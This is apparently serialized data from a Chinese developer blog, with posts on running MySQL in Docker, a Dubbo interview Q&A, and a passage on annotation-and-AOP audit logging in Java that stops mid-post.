container-name/container-id\n\n更多命令参看\nhttps://docs.docker.com/engine/reference/commandline/docker/\n可以参考每一个镜像的文档\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 3）、安装mysql示例\n\ndocker pull mysql\n\n\n1\n\n\n错误的启动\n\n[root@localhost ~]# docker run --name mysql01 -d mysql\n42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846\n\nmysql退出了\n[root@localhost ~]# docker ps -a\ncontainer id        image               command                  created             status                           ports               names\n42f09819908b        mysql               "docker-entrypoint.sh"   34 seconds ago      exited (1) 33 seconds ago                            mysql01\n538bde63e500        tomcat              "catalina.sh run"        about an hour ago   exited (143) about an hour ago                       compassionate_\ngoldstine\nc4f1ac60b3fc        tomcat              "catalina.sh run"        about an hour ago   exited (143) about an hour ago                       lonely_fermi\n81ec743a5271        tomcat              "catalina.sh run"        about an hour ago   exited (143) about an hour ago                       sick_ramanujan\n\n\n//错误日志\n[root@localhost ~]# docker logs 42f09819908b\nerror: database is uninitialized and password option is not specified\n  you need to specify one of mysql_root_password, mysql_allow_empty_password and mysql_random_root_password；这个三个参数必须指定一个\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n正确的启动\n\n[root@localhost ~]# docker run --name mysql01 -e mysql_root_password=123456 -d mysql\nb874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f\n[root@localhost ~]# docker ps\ncontainer id        image               command                  created             status              ports               names\nb874c56bec49        mysql               "docker-entrypoint.sh"   4 seconds ago       up 3 seconds        3306/tcp            mysql01\n\n\n1\n2\n3\n4\n5\n\n\n做了端口映射\n\n[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e mysql_root_password=123456 -d mysql\nad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434\n[root@localhost ~]# docker ps\ncontainer id        image               command                  created             status              ports                    names\nad10e4bc5c6a        mysql               "docker-entrypoint.sh"   4 seconds ago       up 2 seconds        0.0.0.0:3306->3306/tcp   mysql02\n\n\n1\n2\n3\n4\n5\n\n\n几个其他的高级操作\n\ndocker run --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e mysql_root_password=my-secret-pw -d mysql:tag\n把主机的/conf/mysql文件夹挂载到 mysqldocker容器的/etc/mysql/conf.d文件夹里面\n改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（/conf/mysql）\n\ndocker run --name some-mysql -e mysql_root_password=my-secret-pw -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci\n指定mysql的一些配置参数\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 5、其它\n\n * 开发者必备docker命令\n * 使用maven插件构建docker镜像\n * docker在linux下的各种操作\n * 使用dockerfile为springboot应用构建docker镜像\n * 使用docker compose部署springboot应用',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Dubbo 连环问",frontmatter:{title:"Dubbo 连环问",date:"2019-07-22T00:00:00.000Z",tags:["Dubbo"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/dubbo.html",relativePath:"views/backend/dubbo.md",key:"v-118ec314",path:"/views/backend/dubbo.html",headers:[{level:3,title:"Dubbo 是什么",slug:"dubbo-是什么",normalizedTitle:"dubbo 是什么",charIndex:3},{level:3,title:"为什么要用 Dubbo",slug:"为什么要用-dubbo",normalizedTitle:"为什么要用 dubbo",charIndex:16},{level:3,title:"Dubbo 和 Spring Cloud 有什么区别",slug:"dubbo-和-spring-cloud-有什么区别",normalizedTitle:"dubbo 和 spring cloud 有什么区别",charIndex:31},{level:3,title:"HTTP 和 RPC 的区别",slug:"http-和-rpc-的区别",normalizedTitle:"http 和 rpc 的区别",charIndex:61},{level:3,title:"Dubbo 需要 Web 容器吗",slug:"dubbo-需要-web-容器吗",normalizedTitle:"dubbo 需要 web 容器吗",charIndex:79},{level:3,title:"Dubbo 内置了哪几种服务容器",slug:"dubbo-内置了哪几种服务容器",normalizedTitle:"dubbo 内置了哪几种服务容器",charIndex:99},{level:3,title:"dubbo 都支持什么协议，推荐用哪种",slug:"dubbo-都支持什么协议-推荐用哪种",normalizedTitle:"dubbo 都支持什么协议，推荐用哪种",charIndex:119},{level:3,title:"Dubbo 里面有哪几种节点角色",slug:"dubbo-里面有哪几种节点角色",normalizedTitle:"dubbo 里面有哪几种节点角色",charIndex:142},{level:3,title:"dubbo 服务注册与发现的流程图",slug:"dubbo-服务注册与发现的流程图",normalizedTitle:"dubbo 服务注册与发现的流程图",charIndex:162},{level:3,title:"Dubbo 默认使用什么注册中心，还有别的选择吗",slug:"dubbo-默认使用什么注册中心-还有别的选择吗",normalizedTitle:"dubbo 默认使用什么注册中心，还有别的选择吗",charIndex:183},{level:3,title:"Dubbo 核心的配置有哪些",slug:"dubbo-核心的配置有哪些",normalizedTitle:"dubbo 核心的配置有哪些",charIndex:211},{level:3,title:"在 Provider 上可以配置的 Consumer 端的属性有哪些",slug:"在-provider-上可以配置的-consumer-端的属性有哪些",normalizedTitle:"在 provider 上可以配置的 consumer 端的属性有哪些",charIndex:229},{level:3,title:"Dubbo 有哪几种负载均衡策略，默认是哪种",slug:"dubbo-有哪几种负载均衡策略-默认是哪种",normalizedTitle:"dubbo 有哪几种负载均衡策略，默认是哪种",charIndex:267},{level:3,title:"Dubbo 启动时如果依赖的服务不可用会怎样",slug:"dubbo-启动时如果依赖的服务不可用会怎样",normalizedTitle:"dubbo 启动时如果依赖的服务不可用会怎样",charIndex:293},{level:3,title:"Dubbo 推荐使用什么序列化框架，你知道的还有哪些",slug:"dubbo-推荐使用什么序列化框架-你知道的还有哪些",normalizedTitle:"dubbo 推荐使用什么序列化框架，你知道的还有哪些",charIndex:319},{level:3,title:"Dubbo 默认使用的是什么通信框架，还有别的选择吗",slug:"dubbo-默认使用的是什么通信框架-还有别的选择吗",normalizedTitle:"dubbo 默认使用的是什么通信框架，还有别的选择吗",charIndex:349},{level:3,title:"Dubbo 有哪几种集群容错方案，默认是哪种",slug:"dubbo-有哪几种集群容错方案-默认是哪种",normalizedTitle:"dubbo 有哪几种集群容错方案，默认是哪种",charIndex:379},{level:3,title:"服务提供者能实现失效踢出是什么原理",slug:"服务提供者能实现失效踢出是什么原理",normalizedTitle:"服务提供者能实现失效踢出是什么原理",charIndex:405},{level:3,title:"Dubbo 服务之间的调用是阻塞的吗",slug:"dubbo-服务之间的调用是阻塞的吗",normalizedTitle:"dubbo 服务之间的调用是阻塞的吗",charIndex:426},{level:3,title:"Dubbo 的管理控制台能做什么",slug:"dubbo-的管理控制台能做什么",normalizedTitle:"dubbo 的管理控制台能做什么",charIndex:448},{level:3,title:"Dubbo 服务暴露的过程",slug:"dubbo-服务暴露的过程",normalizedTitle:"dubbo 服务暴露的过程",charIndex:468},{level:3,title:"当一个服务接口有多种实现时怎么做？",slug:"当一个服务接口有多种实现时怎么做",normalizedTitle:"当一个服务接口有多种实现时怎么做？",charIndex:485},{level:3,title:"服务上线怎么兼容旧版本",slug:"服务上线怎么兼容旧版本",normalizedTitle:"服务上线怎么兼容旧版本",charIndex:506},{level:3,title:"Dubbo 和 Dubbox 有什么区别",slug:"dubbo-和-dubbox-有什么区别",normalizedTitle:"dubbo 和 dubbox 有什么区别",charIndex:521},{level:3,title:"你觉得用 Dubbo 好还是 Spring Cloud 好",slug:"你觉得用-dubbo-好还是-spring-cloud-好",normalizedTitle:"你觉得用 dubbo 好还是 spring cloud 好",charIndex:545},{level:3,title:"出现调用超时 com.alibaba.dubbo.remoting.TimeoutException 异常怎么办",slug:"出现调用超时-com-alibaba-dubbo-remoting-timeoutexception-异常怎么办",normalizedTitle:"出现调用超时 com.alibaba.dubbo.remoting.timeoutexception 异常怎么办",charIndex:578},{level:3,title:"出现 java.util.concurrent.RejectedExecutionException 或者 Thread pool exhausted 怎么办",slug:"出现-java-util-concurrent-rejectedexecutionexception-或者-thread-pool-exhausted-怎么办",normalizedTitle:"出现 java.util.concurrent.rejectedexecutionexception 或者 thread pool exhausted 怎么办",charIndex:638}],excerpt:"<Boxx/>\n",headersStr:"Dubbo 是什么 为什么要用 Dubbo Dubbo 和 Spring Cloud 有什么区别 HTTP 和 RPC 的区别 Dubbo 需要 Web 容器吗 Dubbo 内置了哪几种服务容器 dubbo 都支持什么协议，推荐用哪种 Dubbo 里面有哪几种节点角色 dubbo 服务注册与发现的流程图 Dubbo 默认使用什么注册中心，还有别的选择吗 Dubbo 核心的配置有哪些 在 Provider 上可以配置的 Consumer 端的属性有哪些 Dubbo 有哪几种负载均衡策略，默认是哪种 Dubbo 启动时如果依赖的服务不可用会怎样 Dubbo 推荐使用什么序列化框架，你知道的还有哪些 Dubbo 默认使用的是什么通信框架，还有别的选择吗 Dubbo 有哪几种集群容错方案，默认是哪种 服务提供者能实现失效踢出是什么原理 Dubbo 服务之间的调用是阻塞的吗 Dubbo 的管理控制台能做什么 Dubbo 服务暴露的过程 当一个服务接口有多种实现时怎么做？ 服务上线怎么兼容旧版本 Dubbo 和 Dubbox 有什么区别 你觉得用 Dubbo 好还是 Spring Cloud 好 出现调用超时 com.alibaba.dubbo.remoting.TimeoutException 异常怎么办 出现 java.util.concurrent.RejectedExecutionException 或者 Thread pool exhausted 怎么办",content:' * Dubbo 是什么\n * 为什么要用 Dubbo\n * Dubbo 和 Spring Cloud 有什么区别\n * HTTP 和 RPC 的区别\n * Dubbo 需要 Web 容器吗\n * Dubbo 内置了哪几种服务容器\n * dubbo 都支持什么协议，推荐用哪种\n * Dubbo 里面有哪几种节点角色\n * dubbo 服务注册与发现的流程图\n * Dubbo 默认使用什么注册中心，还有别的选择吗\n * Dubbo 核心的配置有哪些\n * 在 Provider 上可以配置的 Consumer 端的属性有哪些\n * Dubbo 有哪几种负载均衡策略，默认是哪种\n * Dubbo 启动时如果依赖的服务不可用会怎样\n * Dubbo 推荐使用什么序列化框架，你知道的还有哪些\n * Dubbo 默认使用的是什么通信框架，还有别的选择吗\n * Dubbo 有哪几种集群容错方案，默认是哪种\n * 服务提供者能实现失效踢出是什么原理\n * Dubbo 服务之间的调用是阻塞的吗\n * Dubbo 的管理控制台能做什么\n * Dubbo 服务暴露的过程\n * 当一个服务接口有多种实现时怎么做？\n * 服务上线怎么兼容旧版本\n * Dubbo 和 Dubbox 有什么区别\n * 你觉得用 Dubbo 好还是 Spring Cloud 好\n * 出现调用超时 com.alibaba.dubbo.remoting.TimeoutException 异常怎么办\n * 出现 java.util.concurrent.RejectedExecutionException 或者 Thread pool exhausted 怎么办\n\n\n\n\n# Dubbo 是什么\n\nDubbo 是阿里巴巴开源的基于 Java 的高性能 RPC（一种远程调用） 分布式服务框架（SOA），致力于提供高性能和透明化的 RPC 远程服务调用方案，以及 SOA 服务治理方案。\n\n\n# 为什么要用 Dubbo\n\n因为是阿里开源项目，国内很多互联网公司都在用，已经经过很多线上考验。内部使用了 Netty、Zookeeper，保证了高性能高可用性。\n\n1、使用Dubbo可以将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，可用于提高业务复用 灵活扩展，使前端应用能更快速的响应多变的市场需求。 2、分布式架构可以承受更大规模的并发流量。\n\n\n# Dubbo 和 Spring Cloud 有什么区别\n\n1、通信方式不同：Dubbo 使用的是 RPC 通信，而Spring Cloud 使用的是HTTP RESTFul 方式。\n\n2、组成不一样：dubbo的服务注册中心为Zookeerper，服务监控中心为dubbo-monitor,无消息总线，服务跟踪、批量任务等组件； spring-cloud的服务注册中心为spring-cloud netflix enruka，服务监控中心为spring-boot admin,有消息总线，数据流、服务跟踪、批量任务等组件；\n\n\n# HTTP 和 RPC 的区别\n\nRPC 主要用于公司内部的服务调用，性能消耗低，传输效率高，实现复杂。\n\nHTTP 主要用于对外的异构环境，浏览器接口调用，App 接口调用，第三方接口调用等。\n\nRPC 使用场景 (大型的网站，内部子系统较多、接口非常多的情况下适合使用 RPC)：\n\n长链接。不必每次通信都要像 HTTP 一样去 3 次握手，减少了网络开销。 注册发布机制。RPC 框架一般都有注册中心，有丰富的监控管理；发布、下线接口、动态扩展等，对调用方来说是无感知、统一化的操作。 安全性，没有暴露资源操作。 微服务支持。就是最近流行的服务化架构、服务化治理，RPC 框架是一个强力的支撑。\n\n\n# Dubbo 需要 Web 容器吗\n\n不需要，如果硬要用 Web 容器，只会增加复杂性，也浪费资源。\n\n\n# Dubbo 内置了哪几种服务容器\n\n三种服务容器： 1、Spring Container 2、Jetty Container 3、Log4j Container\n\nDubbo 的服务容器只是一个简单的 Main 方法，并加载一个简单的 Spring 容器，用于暴露服务。\n\n\n# dubbo 都支持什么协议，推荐用哪种\n\n1、dubbo://（推荐） 2、http:// 3、rest:// 4、redis:// 5、memcached://\n\n\n# Dubbo 里面有哪几种节点角色\n\n1、provide：暴露服务的服务提供方 2、consumer：调用远程服务的服务消费方 3、registry:服务注册于发现的注册中心 4、monitor:统计服务调用次数和调用时间的监控中心 5、container:服务运行容器\n\n\n# dubbo 服务注册与发现的流程图\n\n\n\n\n# Dubbo 默认使用什么注册中心，还有别的选择吗\n\n推荐使用 zookeeper 作为注册中心，还有 redis、multicast、simple 注册中心。\n\n\n# Dubbo 核心的配置有哪些\n\n\n\n\n# 在 Provider 上可以配置的 Consumer 端的属性有哪些\n\n1、timeout：方法调用超时 2、retries：失败重试次数，默认重试 2 次 3、loadbalance：负载均衡算法，默认随机 4、actives 消费者端，最大并发调用限制\n\n\n# Dubbo 有哪几种负载均衡策略，默认是哪种\n\n1、random loadbalance：安权重设置随机概率（默认）； 2、roundrobin loadbalance：轮寻，按照公约后权重设置轮训比例； 3、lastactive loadbalance：最少活跃调用数，若相同则随机； 4、consistenthash loadbalance：一致性hash，相同参数的请求总是发送到同一提供者。\n\n\n# Dubbo 启动时如果依赖的服务不可用会怎样\n\nDubbo 缺省会在启动时检查依赖的服务是否可用，不可用时会抛出异常，阻止 Spring 初始化完成，默认 check="true"，可以通过 check="false" 关闭检查。\n\n\n# Dubbo 推荐使用什么序列化框架，你知道的还有哪些\n\n推荐使用Hessian序列化，还有Duddo、FastJson、Java自带序列化；\n\n\n# Dubbo 默认使用的是什么通信框架，还有别的选择吗\n\nDubbo 默认使用 Netty 框架，也是推荐的选择，另外内容还集成有Mina、Grizzly。\n\n\n# Dubbo 有哪几种集群容错方案，默认是哪种\n\n\n\n\n# 服务提供者能实现失效踢出是什么原理\n\n服务失效踢出基于zookeeper的临时节点原理。\n\n\n# Dubbo 服务之间的调用是阻塞的吗\n\n默认是同步等待结果阻塞的，支持异步调用。 Dubbo 是基于 NIO 的非阻塞实现并行调用，客户端不需要启动多线程即可完成并行调用多个远程服务，相对 多线程开销较小，异步调用会返回一个 Future 对象。\n\nDubbo 暂时不支持分布式事务。\n\n\n# Dubbo 的管理控制台能做什么\n\n管理控制台主要包含：路由规则，动态配置，服务降级，访问控制，权重调整，负载均衡，等管理功能。 注：dubbo源码中的dubbo-admin模块打成war包，发布运行即可得到dubbo控制管理界面。\n\n\n# Dubbo 服务暴露的过程\n\nDubbo 会在 Spring 实例化完 bean 之后，在刷新容器最后一步发布 ContextRefreshEvent 事件的时候，通知 实现了 ApplicationListener 的 ServiceBean 类进行回调 onApplicationEvent 事件方法，Dubbo 会在这个方法 中调用 ServiceBean 父类 ServiceConfig 的 export 方法，而该方法真正实现了服务的（异步或者非异步）发 布。\n\n\n# 当一个服务接口有多种实现时怎么做？\n\n当一个接口有多种实现时，可以用 group 属性来分组，服务提供方和消费方都指定同一个 group 即可。\n\n\n# 服务上线怎么兼容旧版本\n\n可以用版本号（version）过渡，多个不同版本的服务注册到注册中心，版本号不同的服务相互间不引用。这 个和服务分组的概念有一点类似。\n\n\n# Dubbo 和 Dubbox 有什么区别\n\nDubbox 是继 Dubbo 停止维护后，当当网基于 Dubbo 做的一个扩展项目，如加了服务可 Restful 调用，更新了开源组件等。\n\n\n# 你觉得用 Dubbo 好还是 Spring Cloud 好\n\n扩展性的问题，没有好坏，只有适合不适合，我更倾向于使用 Dubbo, Spring Cloud 版本升级太快，组件更新替换太频繁，配置太繁琐。\n\n\n# 出现调用超时 com.alibaba.dubbo.remoting.TimeoutException 异常怎么办\n\n通常是业务处理太慢，可在服务提供方执行：jstack PID > jstack.log 分析线程都卡在哪个方法调用上，这里就是慢的原因。 如果不能调优性能，请将timeout设大。\n\n\n# 出现 java.util.concurrent.RejectedExecutionException 或者 Thread pool exhausted 怎么办\n\n1、RejectedExecutionException表示线程池已经达到最大值，并且没有空闲连，拒绝执行了一些任务。 2、Thread pool exhausted通常是min和max不一样大时，表示当前已创建的连接用完，进行了一次扩充，创建了新线程，但不影响运行。 原因可能是连接池不够用，请调整dubbo.properites中的： // 设成一样大，减少线程池收缩开销\ndubbo.service.min.thread.pool.size=200\ndubbo.service.max.thread.pool.size=200',normalizedContent:' * dubbo 是什么\n * 为什么要用 dubbo\n * dubbo 和 spring cloud 有什么区别\n * http 和 rpc 的区别\n * dubbo 需要 web 容器吗\n * dubbo 内置了哪几种服务容器\n * dubbo 都支持什么协议，推荐用哪种\n * dubbo 里面有哪几种节点角色\n * dubbo 服务注册与发现的流程图\n * dubbo 默认使用什么注册中心，还有别的选择吗\n * dubbo 核心的配置有哪些\n * 在 provider 上可以配置的 consumer 端的属性有哪些\n * dubbo 有哪几种负载均衡策略，默认是哪种\n * dubbo 启动时如果依赖的服务不可用会怎样\n * dubbo 推荐使用什么序列化框架，你知道的还有哪些\n * dubbo 默认使用的是什么通信框架，还有别的选择吗\n * dubbo 有哪几种集群容错方案，默认是哪种\n * 服务提供者能实现失效踢出是什么原理\n * dubbo 服务之间的调用是阻塞的吗\n * dubbo 的管理控制台能做什么\n * dubbo 服务暴露的过程\n * 当一个服务接口有多种实现时怎么做？\n * 服务上线怎么兼容旧版本\n * dubbo 和 dubbox 有什么区别\n * 你觉得用 dubbo 好还是 spring cloud 好\n * 出现调用超时 com.alibaba.dubbo.remoting.timeoutexception 异常怎么办\n * 出现 java.util.concurrent.rejectedexecutionexception 或者 thread pool exhausted 怎么办\n\n\n\n\n# dubbo 是什么\n\ndubbo 是阿里巴巴开源的基于 java 的高性能 rpc（一种远程调用） 分布式服务框架（soa），致力于提供高性能和透明化的 rpc 远程服务调用方案，以及 soa 服务治理方案。\n\n\n# 为什么要用 dubbo\n\n因为是阿里开源项目，国内很多互联网公司都在用，已经经过很多线上考验。内部使用了 netty、zookeeper，保证了高性能高可用性。\n\n1、使用dubbo可以将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，可用于提高业务复用 灵活扩展，使前端应用能更快速的响应多变的市场需求。 2、分布式架构可以承受更大规模的并发流量。\n\n\n# dubbo 和 spring cloud 有什么区别\n\n1、通信方式不同：dubbo 使用的是 rpc 通信，而spring cloud 使用的是http restful 方式。\n\n2、组成不一样：dubbo的服务注册中心为zookeerper，服务监控中心为dubbo-monitor,无消息总线，服务跟踪、批量任务等组件； spring-cloud的服务注册中心为spring-cloud netflix enruka，服务监控中心为spring-boot admin,有消息总线，数据流、服务跟踪、批量任务等组件；\n\n\n# http 和 rpc 的区别\n\nrpc 主要用于公司内部的服务调用，性能消耗低，传输效率高，实现复杂。\n\nhttp 主要用于对外的异构环境，浏览器接口调用，app 接口调用，第三方接口调用等。\n\nrpc 使用场景 (大型的网站，内部子系统较多、接口非常多的情况下适合使用 rpc)：\n\n长链接。不必每次通信都要像 http 一样去 3 次握手，减少了网络开销。 注册发布机制。rpc 框架一般都有注册中心，有丰富的监控管理；发布、下线接口、动态扩展等，对调用方来说是无感知、统一化的操作。 安全性，没有暴露资源操作。 微服务支持。就是最近流行的服务化架构、服务化治理，rpc 框架是一个强力的支撑。\n\n\n# dubbo 需要 web 容器吗\n\n不需要，如果硬要用 web 容器，只会增加复杂性，也浪费资源。\n\n\n# dubbo 内置了哪几种服务容器\n\n三种服务容器： 1、spring container 2、jetty container 3、log4j container\n\ndubbo 的服务容器只是一个简单的 main 方法，并加载一个简单的 spring 容器，用于暴露服务。\n\n\n# dubbo 都支持什么协议，推荐用哪种\n\n1、dubbo://（推荐） 2、http:// 3、rest:// 4、redis:// 5、memcached://\n\n\n# dubbo 里面有哪几种节点角色\n\n1、provide：暴露服务的服务提供方 2、consumer：调用远程服务的服务消费方 3、registry:服务注册于发现的注册中心 4、monitor:统计服务调用次数和调用时间的监控中心 5、container:服务运行容器\n\n\n# dubbo 服务注册与发现的流程图\n\n\n\n\n# dubbo 默认使用什么注册中心，还有别的选择吗\n\n推荐使用 zookeeper 作为注册中心，还有 redis、multicast、simple 注册中心。\n\n\n# dubbo 核心的配置有哪些\n\n\n\n\n# 在 provider 上可以配置的 consumer 端的属性有哪些\n\n1、timeout：方法调用超时 2、retries：失败重试次数，默认重试 2 次 3、loadbalance：负载均衡算法，默认随机 4、actives 消费者端，最大并发调用限制\n\n\n# dubbo 有哪几种负载均衡策略，默认是哪种\n\n1、random loadbalance：安权重设置随机概率（默认）； 2、roundrobin loadbalance：轮寻，按照公约后权重设置轮训比例； 3、lastactive loadbalance：最少活跃调用数，若相同则随机； 4、consistenthash loadbalance：一致性hash，相同参数的请求总是发送到同一提供者。\n\n\n# dubbo 启动时如果依赖的服务不可用会怎样\n\ndubbo 缺省会在启动时检查依赖的服务是否可用，不可用时会抛出异常，阻止 spring 初始化完成，默认 check="true"，可以通过 check="false" 关闭检查。\n\n\n# dubbo 推荐使用什么序列化框架，你知道的还有哪些\n\n推荐使用hessian序列化，还有duddo、fastjson、java自带序列化；\n\n\n# dubbo 默认使用的是什么通信框架，还有别的选择吗\n\ndubbo 默认使用 netty 框架，也是推荐的选择，另外内容还集成有mina、grizzly。\n\n\n# dubbo 有哪几种集群容错方案，默认是哪种\n\n\n\n\n# 服务提供者能实现失效踢出是什么原理\n\n服务失效踢出基于zookeeper的临时节点原理。\n\n\n# dubbo 服务之间的调用是阻塞的吗\n\n默认是同步等待结果阻塞的，支持异步调用。 dubbo 是基于 nio 的非阻塞实现并行调用，客户端不需要启动多线程即可完成并行调用多个远程服务，相对 多线程开销较小，异步调用会返回一个 future 对象。\n\ndubbo 暂时不支持分布式事务。\n\n\n# dubbo 的管理控制台能做什么\n\n管理控制台主要包含：路由规则，动态配置，服务降级，访问控制，权重调整，负载均衡，等管理功能。 注：dubbo源码中的dubbo-admin模块打成war包，发布运行即可得到dubbo控制管理界面。\n\n\n# dubbo 服务暴露的过程\n\ndubbo 会在 spring 实例化完 bean 之后，在刷新容器最后一步发布 contextrefreshevent 事件的时候，通知 实现了 applicationlistener 的 servicebean 类进行回调 onapplicationevent 事件方法，dubbo 会在这个方法 中调用 servicebean 父类 serviceconfig 的 export 方法，而该方法真正实现了服务的（异步或者非异步）发 布。\n\n\n# 当一个服务接口有多种实现时怎么做？\n\n当一个接口有多种实现时，可以用 group 属性来分组，服务提供方和消费方都指定同一个 group 即可。\n\n\n# 服务上线怎么兼容旧版本\n\n可以用版本号（version）过渡，多个不同版本的服务注册到注册中心，版本号不同的服务相互间不引用。这 个和服务分组的概念有一点类似。\n\n\n# dubbo 和 dubbox 有什么区别\n\ndubbox 是继 dubbo 停止维护后，当当网基于 dubbo 做的一个扩展项目，如加了服务可 restful 调用，更新了开源组件等。\n\n\n# 你觉得用 dubbo 好还是 spring cloud 好\n\n扩展性的问题，没有好坏，只有适合不适合，我更倾向于使用 dubbo, spring cloud 版本升级太快，组件更新替换太频繁，配置太繁琐。\n\n\n# 出现调用超时 com.alibaba.dubbo.remoting.timeoutexception 异常怎么办\n\n通常是业务处理太慢，可在服务提供方执行：jstack pid > jstack.log 分析线程都卡在哪个方法调用上，这里就是慢的原因。 如果不能调优性能，请将timeout设大。\n\n\n# 出现 java.util.concurrent.rejectedexecutionexception 或者 thread pool exhausted 怎么办\n\n1、rejectedexecutionexception表示线程池已经达到最大值，并且没有空闲连，拒绝执行了一些任务。 2、thread pool exhausted通常是min和max不一样大时，表示当前已创建的连接用完，进行了一次扩充，创建了新线程，但不影响运行。 原因可能是连接池不够用，请调整dubbo.properites中的： // 设成一样大，减少线程池收缩开销\ndubbo.service.min.thread.pool.size=200\ndubbo.service.max.thread.pool.size=200',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"注解+AOP实现日志记录",frontmatter:{title:"注解+AOP实现日志记录",date:"2019-06-13T00:00:00.000Z",tags:["日志"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/annotationLog.html",relativePath:"views/backend/annotationLog.md",key:"v-fa9c0818",path:"/views/backend/annotationLog.html",headers:[{level:2,title:"1. 编写注解",slug:"_1-编写注解",normalizedTitle:"1. 编写注解",charIndex:3},{level:3,title:"相关注解",slug:"相关注解",normalizedTitle:"相关注解",charIndex:16},{level:2,title:"2. AOP切入",slug:"_2-aop切入",normalizedTitle:"2. aop切入",charIndex:24},{level:3,title:"相关注解",slug:"相关注解-2",normalizedTitle:"相关注解",charIndex:16},{level:4,title:"Aspect方法执行顺序",slug:"aspect方法执行顺序",normalizedTitle:"aspect方法执行顺序",charIndex:2688},{level:3,title:"JoinPoint解析",slug:"joinpoint解析",normalizedTitle:"joinpoint解析",charIndex:48},{level:3,title:"核心方法handleLogInfo()",slug:"核心方法handleloginfo",normalizedTitle:"核心方法handleloginfo()",charIndex:65}],headersStr:"1. 编写注解 相关注解 2. AOP切入 相关注解 Aspect方法执行顺序 JoinPoint解析 核心方法handleLogInfo()",content:' * 1. 编写注解\n   * 相关注解\n * 2. AOP切入\n   * 相关注解\n   * JoinPoint解析\n   * 核心方法handleLogInfo()\n\n\n\n\n# 注解+AOP实现日志记录\n\n * 使用注解+AOP实现日志记录\n\n\n# 1. 编写注解\n\n * com.xxx.xx.util.AuditLogger\n\n\n# 相关注解\n\n 1. @Retention(RetentionPolicy.RUNTIME)：生命周期为运行时\n 2. @Target( { java.lang.annotation.ElementType.METHOD,\n    java.lang.annotation.ElementType.TYPE }) ：该注解可以用于 类、接口，方法 上\n\npackage com.sgcc.bsp.util;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n@Retention(RetentionPolicy.RUNTIME)\n@Target( { java.lang.annotation.ElementType.METHOD,  \n        java.lang.annotation.ElementType.TYPE })  \npublic @interface AuditLogger {  \n    \n    //日志记录\n    public abstract String log();  \n    //作用于类和方法上，如果方法注解中该属性不为空,则该方法的类型会覆盖类定义的类型\n    public CodeEnum typeCode() default CodeEnum.NULL;\n    //作用于方法上，用于标记增加、删除、修改操作，这些操作必须被记录，不能被关闭\n    public boolean forceRecord() default false;\n    \n    public enum CodeEnum {\n    \t\n    \tSYSTEM("0"),//系统日志\n    \tNULL(""),\n    \tMANAGEMENT("1"),//管理模块\n    \tOTHER("2"),//其它模块等\n    \tprivate String code;\n    \t\n    \tprivate CodeEnum(String code){\n    \t\tthis.code = code;\n    \t}\n    \tpublic String getCode() {\n    \t\treturn code;\n    \t}\n    \t\n    \tpublic void setCode(String code) {\n    \t\tthis.code = code;\n    \t}\n    }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 2. AOP切入\n\n * com.xxx.xx.util.WebLogAspect\n\n\n# 相关注解\n\n 1. @Aspect：作用是把当前类标识为一个切面类供spring容器读取\n\n 2. @Pointcut：Pointcut是植入Advice的触发条件。每个Pointcut的定义包括2部分，一是表达式，二是方法签名。\n\n方法签名必须是 public及void型。可以将Pointcut中的方法看作是一个被Advice引用的助记符，因为表达式不直观，因此我们可以通过方法签名的方式为 此表达式命名。因此Pointcut中的方法只需要方法签名，而不需要在方法体内编写实际代码。\n\n 3. @Around：环绕增强，相当于MethodInterceptor\n\n 4. @AfterReturning：后置增强，相当于AfterReturningAdvice，方法正常退出时执行\n\n 5. @Before：标识一个前置增强方法，相当于BeforeAdvice的功能，相似功能的还有\n\n 6. @AfterThrowing：异常抛出增强，相当于ThrowsAdvice\n\n 7. @After: final增强，不管是抛出异常或者正常退出都会执行\n\n@Aspect\npublic class WebLogAspect {\n\n    @Pointcut("@annotation(com.xxx.xx.util.AuditLogger)")\n    public void webLog(){}\n\n    @Before("webLog()")\n    public void doBefore(JoinPoint joinPoint) throws Throwable {\n    }\n    \n    @After("webLog()")\n    public void doAfter(JoinPoint joinPoint) throws Throwable {\n    }\n\n    @AfterReturning(returning = "ret", pointcut = "webLog()")\n    public void doAfterReturning(JoinPoint joinPoint,Object ret) throws Throwable {\n\t\thandleLogInfo(joinPoint,null);\n    }\n    \n    @AfterThrowing(pointcut = "webLog()", throwing= "error")\n    public void afterThrowingAdvice(JoinPoint joinPoint, Throwable error) throws Exception{\n\t\thandleLogInfo(joinPoint,error);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# Aspect方法执行顺序\n\nbefore around\nbefore\n-- sayHello() --\nafter around\nafter\nafter return\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# JoinPoint解析\n\n * 获取代理类和被代理类对象\n\n方法名                         功能\nSignature getSignature();   获取封装了署名信息的对象,在该对象中可以获取到目标方法名,所属类的Class等信息\nObject[] getArgs();         获取传入目标方法的参数对象\nObject getTarget();         获取被代理的对象\nObject getThis();           获取代理对象\n\n * 